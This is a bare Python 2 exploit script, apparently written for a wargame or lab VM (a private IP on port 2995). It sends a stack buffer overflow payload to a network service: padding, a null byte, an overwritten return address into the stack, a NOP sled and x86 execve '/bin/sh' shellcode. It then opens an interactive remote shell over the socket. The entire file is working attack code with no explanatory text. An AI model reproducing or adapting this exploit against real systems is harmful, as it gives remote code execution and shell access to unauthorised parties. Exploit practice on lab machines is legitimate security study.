#!/usr/bin/python

import struct
import socket
import telnetlib

IP = "192.168.43.218"
PORT = 2995


sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM) 
sock.connect((IP , PORT))



PAD = "A" * 531

RET = struct.pack("I" , 0x08049832)

NULL = "\x00"

STACK = struct.pack("I" , 0xbffffc60 + 30)

NOPS = "\x90" * 148

SHELL = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

exploit = PAD + NULL + STACK + NOPS + SHELL 
sock.send(exploit)

print "Enter Any character to start the session!"


tel = telnetlib.Telnet()
tel.sock = sock
tel.interact()



